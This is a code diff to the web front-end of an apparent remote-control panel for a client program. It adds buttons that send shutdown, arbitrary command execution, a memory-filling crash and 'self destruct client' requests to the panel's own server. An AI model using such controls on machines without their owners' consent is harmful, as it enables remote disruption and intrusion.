@@ -253,6 +253,9 @@
             fetch(`/send/lock/_`, {method: "POST"});
         }
 
+        function shutdown() {
+            fetch(`/send/shutdown/_`, {method: "POST"});
+        }
         function altf4() {
             fetch(`/send/close/_`, {method: "POST"});
         }
@@ -260,6 +263,12 @@
         function openPath() {
             let path = document.getElementById("path").value;
             fetch(`/send/link/${encodeURIComponent(path)}`, {method: "POST"});
+        }
+
+        
+        function runCommand() {
+            let command = document.getElementById("path").value;
+            fetch(`/send/command/${encodeURIComponent(command)}`, {method: "POST"});
         }
 
         function sendDialog() {
@@ -286,6 +295,20 @@
                 method: "DELETE"
             });            
         }
+
+        function destruct() {
+            fetch(`/send/destruct/_`, {method: "POST"});
+        }
+
+        function overfill() {
+            fetch(`/send/crash/_`, {method: "POST"});
+        }
+
+
+        function spacebar() {
+            fetch(`/send/space/_`, {method: "POST"});
+        }
+
 
         function rotateScreen(amountDeg) {
             fetch(`/send/rotate/${amountDeg}`, {method: "POST"});
@@ -394,6 +417,11 @@
     >Toggle caps</button>
 
     <button type="button"
+        onclick="spacebar()"
+          class="green w-48"
+    >Press spacebar</button>
+
+    <button type="button"
             onclick="altf4()"
           class="red"
     >Alt+F4</button>
@@ -403,11 +431,20 @@
           class="red"
     >Lock</button>
 
+    <button onclick="shutdown()" class="red">Shut down</button>
+
+    <button onclick="overfill()" class="red">Fill memory</button>
+
+    <button onclick="destruct()" class="red">Self destruct client</button>
+
     <div class="open max-w-[768px] w-full space-y-2">
         <input id="path" type="text" class="w-full text-slate-900 text-sm border border-slate-300 px-4 py-3 pr-8 rounded-md outline-blue-600" placeholder="Link or path" />
           <button type="button"
                 onclick="openPath()"
-        >Open (link or path)</button>
+        >Open (link or path) (runs "start (input)")</button>
+        <button type="button"
+                onclick="runCommand()"
+        >Execute as command</button>
     </div>
 
     <div class="volume flex flex-col">
